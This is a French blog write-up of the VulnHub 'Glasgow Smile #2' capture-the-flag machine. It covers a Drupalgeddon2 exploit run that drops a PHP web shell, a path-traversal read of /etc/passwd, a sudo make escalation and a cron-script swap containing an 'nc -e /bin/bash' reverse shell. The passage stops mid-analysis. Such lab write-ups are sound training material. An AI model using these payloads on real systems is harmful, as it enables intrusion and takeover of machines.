---
title: "Solution du CTF Glasgow Smile #2 de VulnHub"
tags: [CTF,VulnHub]
---

[Glasgow Smile #2](https://vulnhub.com/entry/glasgow-smile-2,513/) est un CTF posté sur *VulnHub* qui va vous occuper un moment. Il y a toutefois des moments où il est assez difficile de trouver ce qui est attendu.

En termes de technicité, un peu de programmation ainsi que des connaissances Unix sont requises.

## Happy face

Deux ports web sont accessibles, mais ils semblent en tout point identiques.

```
Nmap scan report for 192.168.56.225
Host is up (0.0021s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open     http       Apache httpd 2.4.38 ((Debian))
83/tcp   open     http       Apache httpd 2.4.38 ((Debian))
8080/tcp filtered http-proxy
```

On n'y trouve d'ailleurs rien d'intéressant ce qui m'amène à lancer une énumération web. La wordlist `raft-large-files.txt` de `fuzzdb` permet de trouver un fichier texte :

```console
$ curl -s http://192.168.56.225/todo.txt
         (          
 (       )\ )    )  
 )\ )   (()/( ( /(  
(()/(    /(_)))(_)) 
 /(_))_ (_)) ((_)   
(_)) __|/ __||_  )  
  | (_ |\__ \ / /   
   \___||___//___|  
                    


TODO:

Remember to delete the file after you finish writing the bash automatic script.

Do I really look like a guy with a plan? You know what I am? I'm a dog chasing cars.

I wouldn't know what to do with one if I caught it! You know, I just... do things.

Joker
```

Il est mention d'un script bash, on va donc tenter de le trouver en brute forçant les fichiers avec extension `.sh`.

L'opération m'a remonté la présence d'un script `joke.sh` à la racine du serveur web :

```bash
##
# Glasgow Smile 2 Authentication Script
#
#########################################################################################################################
##
#script for authentication in progress. At the moment it only works with a single command.

curl -u user:password http://localhost/Glasgow---Smile2/
# Don't use commands like that in automated scripts, I saved a file with some network traffic packets captured.
# Analyze it and delete the script.I don't have permission to do it. Stupid Asshole.

# Base URL of your web site.
#site_url="http://example.com"

# Endpoint URL for login action.
#login_url="$site_url/service/path/user/login"


# Path to temporary file which will store your cookie data.
#cookie_path=/tmp/cookie

# URL of your custom action.
#action_url="$site_url/service/path/custom/action"

# This is data that you want to send to your custom endpoint.
#data="name=Alex&hobby=Drupal"

##
# Logic. Most likely you shouldn't change here anything.
##

# Get token and construct the cookie, save the returned token.
#token=$(curl -b $cookie_path -c $cookie_path --request GET "$site_url/services/session/token" -s)

# Authentication. POST to $login_url with the token in header "X-CSRF-Token: $token".
#curl -H "X-CSRF-Token: $token" -b $cookie_path -c $cookie_path -d "username=$username&password=$password" "$login_url" -s

# Get new token after authentication.
#token=$(curl -b $cookie_path -c $cookie_path --request GET "$site_url/services/session/token" -s)

# Send POST to you custom action URL. With the token in header "X-CSRF-Token: $token"
#curl -H "X-CSRF-Token: $token" -b $cookie_path -c $cookie_path -d "$data" "$action_url" -s
```

On découvre un PATH dans une URL qui est valide sur le CTF et correspond à un Drupal. J'ai lancé `droopescan` et `joomscan` dessus, mais ils n'ont rien trouvé de très intéressant :

```console
$ droopescan scan drupal -u http://192.168.56.225/Glasgow---Smile2/
[+] No plugins found.                                                           

[+] No themes found.

[+] Possible version(s):
    8.3.6

[+] No interesting urls found.

[+] Scan finished (0:00:19.601054 elapsed)
```

Au mieux le CMS sera vulnérable à *Drupalgeddon2*, ce que nous testerons plus tard.

On peut s'attarder sur la mention d'une capture réseau qui doit trainer quelque part.

La difficulté ici a été de choisir la bonne wordlist car le mot clé attendu n'est pas présent dans toutes.

```console
$ feroxbuster -u http://192.168.56.225/ -w DirBuster-0.12/directory-list-lowercase-2.3-big.txt -n -x pcap

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.225/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-lowercase-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [pcap]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      321c http://192.168.56.225/javascript
403        9l       28w      279c http://192.168.56.225/server-status
200       21l       62w     1506c http://192.168.56.225/smileyface.pcap
[####################] - 8m   2370478/2370478 0s      found:4       errors:0      
[####################] - 8m   2370478/2370478 4484/s  http://192.168.56.225/
```

L'analyse du `pcap` est aisée car il n'y a qu'une seule requête HTTP dans la capture :

```http
GET /drupal/login HTTP/1.1
Host: glasgowsmile
Authorization: Basic YWRtaW46Y1B5R0RnVkpOZk5MMkxLNHB4NW4=
User-Agent: curl/7.64.0
Accept: */*

HTTP/1.1 301 Moved Permanently
Cache-Control: private
Content-Type: text/html; charset=utf-8
Location: https://www.google.com
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Wed, 15 Jul 2020 17:28:09 GMT
Content-Length: 139

<html><head><title>Object moved</title></head><body>
<h2>Object moved to <a href="https://www.google.com">here</a>.</h2>
</body></html>
```

Le base64 se décode de cette façon : `admin:cPyGDgVJNfNL2LK4px5n`

## GToutPT

Les identifiants fonctionnent sur le Drupal mais impossible d'obtenir une RCE comme c'était le cas sur le [DC #1]({% link _posts/2023-03-20-Solution-du-CTF-DC-1-de-VulnHub.md %}). J'ai tenté d'activer différents modules existants via l'interface admin et tout ce que j'ai obtenu, c'est une bonne erreur 500 et l'impossibilité d'accéder au Drupal.

Après remise en place de la VM j'ai donc laissé tomber les identifiants et je me suis orienté vers *Drupalgeddon2*.

J'ai utilisé cet exploit écrit en Ruby : [Drupalgeddon2 Remote Code Execution - PHP webapps Exploit](https://www.exploit-db.com/exploits/44449)

Il requiert un module nommé `highline` mais une fois installé ça fonctionne :

```console
$ ruby drupalgeddon2.rb http://192.168.56.226/Glasgow---Smile2/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://192.168.56.226/Glasgow---Smile2/
--------------------------------------------------------------------------------
[+] Header : v8 [X-Generator]
[!] MISSING: http://192.168.56.226/Glasgow---Smile2/CHANGELOG.txt    (HTTP Response: 404)
[+] Found  : http://192.168.56.226/Glasgow---Smile2/core/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v8.3.4
--------------------------------------------------------------------------------
[*] Testing: Form   (user/register)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: mail)
[i] Payload: echo GFIZINYU
[+] Result : GFIZINYU
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://192.168.56.226/Glasgow---Smile2/shell.php)
[i] Response: HTTP 404 // Size: 14
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://192.168.56.226/Glasgow---Smile2/shell.php' -d 'c=hostname'
glasgowsmile2>> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
glasgowsmile2>> pwd
/var/www/html/Glasgow---Smile2
glasgowsmile2>> uname -a
Linux glasgowsmile2 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
```

## Le Petit Tour

C'est parti pour l'énumération locale. Différents utilisateurs sont présents :

```
bane:x:1000:1000:bane,,,:/home/bane:/bin/bash
carnage:x:1001:1001:carnage,,,:/home/carnage:/bin/bash
venom:x:1002:1002:venom,,,:/home/venom:/bin/bash
riddler:x:1003:1003:Riddler,,,:/home/riddler:/bin/bash
```

Malheureusement on ne peut pas faire grand-chose à la vue des permissions :

```console
www-data@glasgowsmile2:/home$ find . -type f -ls 2> /dev/null 
  1057575      4 -rw-r--r--   1 bane     bane          807 Jun 18  2020 ./bane/.profile
  1060821      4 -rw-------   1 bane     bane            1 May 31 05:38 ./bane/.bash_history
  1065702    228 -rw-r--r--   1 bane     bane       233193 Jul  9  2020 ./bane/riddler.jpg
  1057576      4 -rw-r--r--   1 bane     bane         3526 Jun 18  2020 ./bane/.bashrc
  1065700      4 -rw-r--r--   1 bane     bane           66 Jul  3  2020 ./bane/.selected_editor
  1065719      4 -rw-------   1 bane     bane          177 Jul 17  2020 ./bane/.Xauthority
  1062203      4 -rw-------   1 bane     bane           38 Jul  3  2020 ./bane/user2.txt
  1057577      4 -rw-r--r--   1 bane     bane          220 Jun 18  2020 ./bane/.bash_logout
  1061177      4 -rw-r--r--   1 carnage  carnage       807 Jun 25  2020 ./carnage/.profile
  1061190      4 -rw-------   1 carnage  carnage         1 May 31 05:38 ./carnage/.bash_history
  1061187      4 -rw-r--r--   1 carnage  carnage      3526 Jun 25  2020 ./carnage/.bashrc
  1065516      4 -rw-r--r--   1 carnage  carnage        66 Jul  3  2020 ./carnage/.selected_editor
  1065701      4 -rw-r--r--   1 carnage  carnage       165 Jun 30  2020 ./carnage/.wget-hsts
  1065711      4 -rw-------   1 carnage  carnage       118 Jul  6  2020 ./carnage/.Xauthority
  1060818      4 -rw-r-----   1 carnage  carnage        38 Jun 30  2020 ./carnage/user3.txt
  1061189      4 -rw-r--r--   1 carnage  carnage       220 Jun 25  2020 ./carnage/.bash_logout
  1062186      4 -rw-r--r--   1 venom    venom         807 Jun 27  2020 ./venom/.profile
  1062193      4 -rw-------   1 venom    venom           1 May 31 05:38 ./venom/.bash_history
  1061167      4 -rw-r-----   1 venom    venom          38 Jun 30  2020 ./venom/user4.txt
  1062187      4 -rw-r--r--   1 venom    venom        3526 Jun 27  2020 ./venom/.bashrc
  1062189      4 -rw-r--r--   1 venom    venom          66 Jun 27  2020 ./venom/.selected_editor
  1062201      4 -rw-------   1 venom    venom         177 Jun 27  2020 ./venom/.Xauthority
  1062188      4 -rw-r--r--   1 venom    venom         220 Jun 27  2020 ./venom/.bash_logout
  1052942      4 -rw-r--r--   1 riddler  riddler       807 Jul  7  2020 ./riddler/.profile
  1060819      4 -rw-------   1 riddler  riddler         1 May 31 05:38 ./riddler/.bash_history
   663166      4 -rw-r-----   1 riddler  riddler      1083 Jun 30  2020 ./riddler/theworldmustbeburned/message.txt
   663167      4 -rwxrwx---   1 riddler  riddler       845 Jun 30  2020 ./riddler/theworldmustbeburned/burn
   663169      4 -rw-r-----   1 riddler  riddler      1093 Jun 30  2020 ./riddler/theworldmustbeburned/info.txt
   659616      4 -rw-r-----   1 riddler  riddler       380 Jun 30  2020 ./riddler/theworldmustbeburned/jokerinthepack
  1052948      4 -rw-r--r--   1 riddler  riddler      3526 Jul  7  2020 ./riddler/.bashrc
   663760      4 -rw-r-----   1 riddler  riddler        38 Jun 30  2020 ./riddler/user.txt
  1065716      4 -rw-------   1 riddler  riddler        59 Jul  9  2020 ./riddler/.Xauthority
  1065485      4 -rw-r--r--   1 riddler  riddler       220 Jul  7  2020 ./riddler/.bash_logout
```

Je remarque dans les processus qu'un Docker tourne et est accessible via le port 8080 :

```
root       313  0.0  8.4 797636 85824 ?        Ssl  05:38   0:00 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root       705  0.0  0.7 475092  7584 ?        Sl   05:38   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 80
```

Via `pspy` je remarque aussi une tache planifiée pour un script Python :

```
2023/05/31 06:29:01 CMD: UID=0    PID=21182  | /usr/sbin/CRON -f 
2023/05/31 06:29:01 CMD: UID=0    PID=21186  | sh /root/task.sh 
2023/05/31 06:29:01 CMD: UID=1002 PID=21185  | /bin/sh -c python /opt/get_out/moonlight.py
```

À ce stade je ne peux pas en savoir plus, faute de permissions :

```console
www-data@glasgowsmile2:/tmp$ ls -al /opt/get_out/moonlight.py
-r-xrwx--- 1 venom venom 374 Jun 30  2020 /opt/get_out/moonlight.py
www-data@glasgowsmile2:/tmp$ ls -ald /opt/get_out/            
drwxr-xr-x 2 carnage venom 4.0K Jul 13  2020 /opt/get_out/
```

## Brainzzzzzz

Après avoir mis un `reverse-ssh` en écoute sur la VM je peux mettre en place un tunnel vers le Docker comme je le ferais avec un serveur SSH normal :

```bash
ssh -p 31337 -N -L 8080:127.0.0.1:8080 192.168.56.226
```

Il s'agit d'un serveur web Nginx avec une page de login :

```html
<h2>Glasgow Smile 2 Login Form</h2>
<!-- If you don't remember your password, use the Riddler application.. P.S=You were right, Nginx is definitely more secure and stable than apache2 ;) -->
<button onclick="document.getElementById('id01').style.display='block'" style="width:auto;">Login</button>

<div id="id01" class="modal">
  
  <form class="modal-content animate" action="action_page.php" method="post">
    <div class="imgcontainer">
      <span onclick="document.getElementById('id01').style.display='none'" class="close" title="Close Modal">&times;</span>
      <img src="glasgow.png" alt="Avatar" class="avatar">
    </div>

    <div class="container">
      <label for="uname"><b>Username</b></label>
      <input type="text" placeholder="Enter Username" name="uname" required>

      <label for="psw"><b>Password</b></label>
      <input type="password" placeholder="Enter Password" name="psw" required>
        
      <button type="submit">Login</button>
      <label>
        <input type="checkbox" checked="checked" name="remember"> Remember me
      </label>
    </div>

    <div class="container" style="background-color:#f1f1f1">
      <button type="button" onclick="document.getElementById('id01').style.display='none'" class="cancelbtn">Cancel</button>
      <span class="psw">Forgot <a href="?page=forgot.php">password?</a></span>
    </div>
  </form>
</div>
```

C'est surtout le dernier lien qui est intéressant, car ça sent fort la faille d'inclusion.

C'est bien le cas, car en passant comme valeur `../../../../../../../../../etc/passwd` j'obtiens cet output :

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
nginx:x:100:101:Linux User,,,:/var/cache/nginx:/sbin/nologin
```

On n'y voit pas d'utilisateurs *humains* ce qui est classique pour un Docker.

On est assez restreints sur l'exploitation de cette faille, car un préfixe est placé avant notre path. Une technique classique est alors de faire injecter des commandes dans un fichier de log et de l'inclure.

À la racine du serveur web je trouve un fichier `error.log` mais les donnés qu'il contient ne correspondent pas à Nginx.

```
Unhandled exception in thread started by <function forward at 0x7f0543cd82a8>
Traceback (most recent call last):
  File "/tmp/python-port-forward/port-forward.py", line 75, in forward
    string = source.recv(1024)
socket.error: [Errno 104] Connection reset by peer
--- snip ---
Unhandled exception in thread started by <function forward at 0x7f0543cd82a8>
Traceback (most recent call last):
  File "/tmp/python-port-forward/port-forward.py", line 79, in forward
    source.shutdown(socket.SHUT_RD)
  File "/usr/lib/python2.7/socket.py", line 228, in meth
    return getattr(self._sock,name)(*args)
socket.error: [Errno 107] Transport endpoint is not connected
Traceback (most recent call last):
  File "/tmp/python-port-forward/port-forward.py", line 83, in <module>
    main('port-forward.config', 'error.log', sys.argv[1:])
  File "/tmp/python-port-forward/port-forward.py", line 38, in main
    time.sleep(60)
KeyboardInterrupt
```

En allant lire le fichier `/etc/nginx/nginx.conf` on peut obtenir la configuration du Nginx. La ligne la plus intéressante (quoique très classique) est celle-ci :

```
    include /etc/nginx/sites-enabled/*;
```

J'ai alors tenté d'exfiltrer `/etc/nginx/sites-enabled/default.conf` et ça a fonctionné :

```nginx
server {
	listen   80; ## listen for ipv4; this line is default and implied
	listen   [::]:80 default ipv6only=on; ## listen for ipv6

	root /var/www/html;
	index index.php index.html index.htm;

	# Make site accessible from http://localhost/
	server_name _;
	
	# Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html
	sendfile off;

	# Add stdout logging
	error_log /dev/stdout info;
	access_log /dev/stdout;

        # Add option for x-forward-for (real ip when behind elb)
        #real_ip_header X-Forwarded-For;
        #set_real_ip_from 172.16.0.0/12;

	# block access to sensitive information about git
	location /.git {
           deny all;
           return 403;
        }

    location /helpmeriddlernewapplication {
        root   /var/www/myplace/hereis/threatened/;
        index  index.php;
    }

	location / {
		# First attempt to serve request as file, then
		# as directory, then fall back to index.html
		try_files $uri $uri/ =404;
	}

--- snip ---
```

Le path `/helpmeriddlernewapplication` semblait prometteur pourtant il me retourne une erreur 404.

J'utilise donc la LFI pour faire charger le fichier PHP directement depuis le disque :

```
http://127.0.0.1:8080/?page=../../../../../../../../../var/www/myplace/hereis/threatened/index.php
```

On a alors un formulaire avec une devinette. J'ai passé la devinette à ChatGPT pour voir s'il pouvait la résoudre :

![ChatGPT solving a riddle](/assets/img/vulnhub/glasgow_smile_2_chatgtp_riddle.png)

C'était ça... ou presque. Si on passe la devinette à Google il nous indique `human brain`, ce qui était la réponse attendue par le formulaire.

Ce dernier nous délivre alors le mot de passe `J2h3cUy5Sc4gXLp5VXrE`.

## In the pack

Il s'avère que ce mot de passe correspond au compte Unix `riddler`. On obtient finalement notre premier flag :

```console
riddler@glasgowsmile2:~$ cat user.txt 
GS2{52ed6cddca27b44be716f9b856744008}
```

Dans le dossier de l'utilisateur je trouve un script PHP qui une fois *beautifié* est le suivant :

```php
<?php

function grdl($q0)
{
    ($b1 = fopen($q0, "r")) or die();
    $a2 = 0;

    while (!feof($b1)) {
        $t3 = fgets($b1);
        $a2++;
    }

    rewind($b1);
    $s4 = 0;
    $n5 = rand(0, $a2);

    while (!feof($b1) && $s4 <= $n5) {
        if ($x6 = fgets($b1, 1048576)) {
            $s4++;
        }
    }

    fclose($b1) or die();
    return $x6;
}

function gws($n7)
{
    $j8 = str_split($n7);
    $a9 = 0;
    foreach ($j8 as $m10) {
        $a9 += ord($m10);
    }
    return $a9;
}

function encrypt($c11, $j12, $e13)
{
    $f14 = true;
    $l15 = gws($c11);
    $q16 = gws($j12);
    $f17 = str_split($e13);
    $a18 = "";

    foreach ($f17 as $m10) {
        $f14 = !$f14;
        $p19 = $l15;

        if ($f14) {
            $p19 = $q16;
        }

        $a18 .= ord($m10) + $p19;

        if ($f14) {
            $a18 .= "A";
        } else {
            $a18 .= "F";
        }
    }
    return $a18;
}

$q0 = "jokerinthepack";
$e13 = readline("Enter the string to encrypt: ");
$c11 = trim(grdl($q0));
$j12 = trim(grdl($q0));
print "\n";
print "Your keys:";
print "\n";
print "Key 1: " . $c11;
print "\n";
print "Key 2: " . $j12;
print "\n";
$a18 = trim(encrypt($c11, $j12, $e13));
print "Encrypted string:" . $a18 . "\n\n\n";
?>
```

Il est assez simple à comprendre.

La première fonction lit le nombre de lignes d'un fichier, prend un nombre aléatoire correspondant à l'une des lignes puis récupère la ligne correspondant au nombre aléatoire.

La seconde fonction est tout aussi simple : elle reçoit une chaine en argument et retourne la somme des codes décimaux de chaque caractère.

La dernière est la plus complexe, mais ça reste compréhensible : elle reçoit les sommes correspondant à deux des lignes pris aléatoirement.

Ensuite elle boucle sur une chaine à chiffrer en ajoutant au code décimal de chaque caractère l'une des sommes (ça alterne). Elle ajoute aussi à chaque fois soit le caractère `A` soit le caractère `F`.

Le fichier qui sert pour les sommes est le suivant :

```console
riddler@glasgowsmile2:~/theworldmustbeburned$ cat jokerinthepack 
Oh my boots they shine
And my bowler looks fine
Take some time and care
Take a look at my hair
We hit the dance hall
So smart and so chic
I make them laught a lot
I make them accept me
Secrets are spoken
Plans are drawn in the dust
With a gay bravado
I'm taken into their trust
Oh my boots they shine
And my bowler looks fine
But don't confide in my smile
Because jokers are wild
```

On trouve aussi un message avec tout ce qu'il faut pour récupérer un message en clair :

```console
riddler@glasgowsmile2:~/theworldmustbeburned$ cat message.txt 
Your keys:
Key 1: I make them laught a lot
Key 2: Because jokers are wild
Encrypted string:2188F2236A2200F2236A2269F2301A2263F2291A2186F2299A2255F2300A2186F2287A2268F2291A2264F2229A2270F2222A2262F2301A2265F2297A2259F2300A2257F2222A2256F2301A2268F2222A2251F2300A2275F2306A2258F2295A2264F2293A2186F2298A2265F2293A2259F2289A2251F2298A2198F2222A2262F2295A2261F2291A2186F2299A2265F2300A2255F2311A2200F2222A2238F2294A2255F2311A2186F2289A2251F2300A2193F2306A2186F2288A2255F2222A2252F2301A2271F2293A2258F2306A2198F2222A2252F2307A2262F2298A2259F2291A2254F2234A2186F2304A2255F2287A2269F2301A2264F2291A2254F2234A2186F2301A2268F2222A2264F2291A2257F2301A2270F2295A2251F2306A2255F2290A2186F2309A2259F2306A2258F2236A2186F2273A2265F2299A2255F2222A2263F2291A2264F2222A2260F2307A2269F2306A2186F2309A2251F2300A2270F2222A2270F2301A2186F2309A2251F2306A2253F2294A2186F2306A2258F2291A2186F2309A2265F2304A2262F2290A2186F2288A2271F2304A2264F2236A2188F2222A2239F2260A2240F2259A2205F2244A2225F2308A2239F2299A2229F2242A2238F2289A2244F2257A2274F2256A2258F2246A2272F2275A2223F2277A2271F2279A2255F2297A2221F2279A
```

J'ai écrit le code suivant qui décode le message :

```python
import re

key1 = sum(ord(c) for c in "I make them laught a lot")
key2 = sum(ord(c) for c in "Because jokers are wild")

cipher = "2188F2236A2200F2236A2269F2301A2263F2291A2186F2299A2255F2300A2186F2287A2268F2291A2264F2229A2270F2222A2262F2301A2265F2297A2259F2300A2257F2222A2256F2301A2268F2222A2251F2300A2275F2306A2258F2295A2264F2293A2186F2298A2265F2293A2259F2289A2251F2298A2198F2222A2262F2295A2261F2291A2186F2299A2265F2300A2255F2311A2200F2222A2238F2294A2255F2311A2186F2289A2251F2300A2193F2306A2186F2288A2255F2222A2252F2301A2271F2293A2258F2306A2198F2222A2252F2307A2262F2298A2259F2291A2254F2234A2186F2304A2255F2287A2269F2301A2264F2291A2254F2234A2186F2301A2268F2222A2264F2291A2257F2301A2270F2295A2251F2306A2255F2290A2186F2309A2259F2306A2258F2236A2186F2273A2265F2299A2255F2222A2263F2291A2264F2222A2260F2307A2269F2306A2186F2309A2251F2300A2270F2222A2270F2301A2186F2309A2251F2306A2253F2294A2186F2306A2258F2291A2186F2309A2265F2304A2262F2290A2186F2288A2271F2304A2264F2236A2188F2222A2239F2260A2240F2259A2205F2244A2225F2308A2239F2299A2229F2242A2238F2289A2244F2257A2274F2256A2258F2246A2272F2275A2223F2277A2271F2279A2255F2297A2221F2279A"

clear = ""
for i, num in enumerate(re.split(r"A|F", cipher)):
    if not num:
        continue

    num = int(num)
    if i % 2 == 0:
        char = chr(num - key1)
    else:
        char = chr(num - key2)

    clear += char

print(clear)
```

J'obtiens alors :

> "...some men aren't looking for anything logical, like money. They can't be bought, bullied, reasoned, or negotiated with. Some men just want to watch the world burn." UFVE36GvUmK4TcZCxBh8vUEWuYekCY

## Faire un carnage

Le mot de passe permet la connexion au compte `bane`.

```console
bane@glasgowsmile2:~$ cat user2.txt 
GS2{5c851b5e9ec996b38b7d0a544013380e}
```

On peut faire exécuter `make` par l'utilisateur `carnage`.

```console
bane@glasgowsmile2:~$ sudo -l
[sudo] password for bane: 
Matching Defaults entries for bane on glasgowsmile2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bane may run the following commands on glasgowsmile2:
    (carnage) /bin/make
```

Il suffit de faire un `Makefile` qui va lancer bash :

```makefile
all:
        @bash
```

Et voilà le travail :

```console
bane@glasgowsmile2:~$ sudo -u carnage /bin/make
carnage@glasgowsmile2:/home/bane$ id
uid=1001(carnage) gid=1001(carnage) groups=1001(carnage),50(staff)
```

Troisième flag :

```console
carnage@glasgowsmile2:~$ cat user3.txt 
GS2{988535ad480d747ef00c705541d08a6e}
```

Cette fois, on retourne vers le script Python rencontré plus tôt :

```console
carnage@glasgowsmile2:/opt/get_out$ cat help.txt 

I wrote a script that automatically allows you to have a zip of your personal folder.
Now you can also delete the zip by mistake, it will be created again.
Am I good or not? ;)

@@@  @@@  @@@@@@@@  @@@  @@@   @@@@@@   @@@@@@@@@@   
@@@  @@@  @@@@@@@@  @@@@ @@@  @@@@@@@@  @@@@@@@@@@@  
@@!  @@@  @@!       @@!@!@@@  @@!  @@@  @@! @@! @@!  
!@!  @!@  !@!       !@!!@!@!  !@!  @!@  !@! !@! !@!  
@!@  !@!  @!!!:!    @!@ !!@!  @!@  !@!  @!! !!@ @!@  
!@!  !!!  !!!!!:    !@!  !!!  !@!  !!!  !@!   ! !@!  
:!:  !!:  !!:       !!:  !!!  !!:  !!!  !!:     !!:  
 ::!!:!   :!:       :!:  !:!  :!:  !:!  :!:     :!:  
  ::::     :: ::::   ::   ::  ::::: ::  :::     ::   
   :      : :: ::   ::    :    : :  :    :      :
```

On ne dispose toujours pas de droits sur le script `moonlight.py` mais on est propriétaire du dossier parent. Dès lors on peut déplacer / supprimer le fichier et en créer un autre à la place :

```console
carnage@glasgowsmile2:/opt/get_out$ ls -al 
total 16
drwxr-xr-x 2 carnage venom   4096 Jul 13  2020 .
drwxr-xr-x 4 root    root    4096 Jul  7  2020 ..
-rw------- 1 carnage carnage  775 Jul 13  2020 help.txt
-r-xrwx--- 1 venom   venom    374 Jun 30  2020 moonlight.py
carnage@glasgowsmile2:/opt/get_out$ mv moonlight.py orig_moonlight.py
carnage@glasgowsmile2:/opt/get_out$ echo -e 'import os\nos.system("nc -e /bin/bash 192.168.56.1 9999")\n' > moonlight.py
```

La crontab doit s'exécuter toutes les minutes, on n'attend pas longtemps :

```console
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.226.
Ncat: Connection from 192.168.56.226:40644.
id
uid=1002(venom) gid=1002(venom) groups=1002(venom)
```

## Crache ton venin

Quatrième flag :

```console
venom@glasgowsmile2:~$ ls -l
ls -l
total 8
drwx------ 3 venom venom 4096 Jun 27  2020 Ladies_and_Gentlmen
-rw-r----- 1 venom venom   38 Jun 30  2020 user4.txt
venom@glasgowsmile2:~$ cat user4.txt
cat user4.txt
GS2{b79aba0d627bcd2025e35c2a192e1d51}
```

On trouve tout un tas d'exécutables :

```console
venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ ls -al
total 272
drwxr-xr-x 2 venom venom  4096 Jun 30  2020 .
drwx------ 3 venom venom  4096 Jun 27  2020 ..
-rwsr-xr-x 1 root  root    988 Jun 23  2020 batman
-rwsr-xr-x 1 root  root  16659 Dec 18  2020 gothamwillburn1
-rwsr-xr-x 1 root  root  16744 Dec 18  2020 gothamwillburn10
-rwsr-xr-x 1 root  root  16749 Dec 18  2020 gothamwillburn11
-rwsr-xr-x 1 root  root  16752 Dec 18  2020 gothamwillburn12
-rwsr-xr-x 1 root  root  16755 Dec 18  2020 gothamwillburn13
-rwsr-xr-x 1 root  root  16660 Dec 18  2020 gothamwillburn2
-rwsr-xr-x 1 root  root  16672 Dec 18  2020 gothamwillburn3
-rwsr-xr-x 1 root  root  16720 Dec 18  2020 gothamwillburn4
-rwsr-xr-x 1 root  root  16675 Dec 18  2020 gothamwillburn5
-rwsr-xr-x 1 root  root  16699 Dec 18  2020 gothamwillburn6
-rwsr-xr-x 1 root  root  16708 Dec 18  2020 gothamwillburn7
-rwsr-xr-x 1 root  root  16723 Dec 18  2020 gothamwillburn8
-rwsr-xr-x 1 root  root  16735 Dec 18  2020 gothamwillburn9
```

Certains de ces ELFs sont invalides :

```console
$ venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ objdump -d gothamwillburn1
objdump: gothamwillburn1: file truncated
```

Et une bonne partie n'a pas vraiment de charge :

```console
venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ objdump -d gothamwillburn3 | grep -A10 '<main>:'
0000000000001145 <main>:
    1145:       55                      push   %rbp
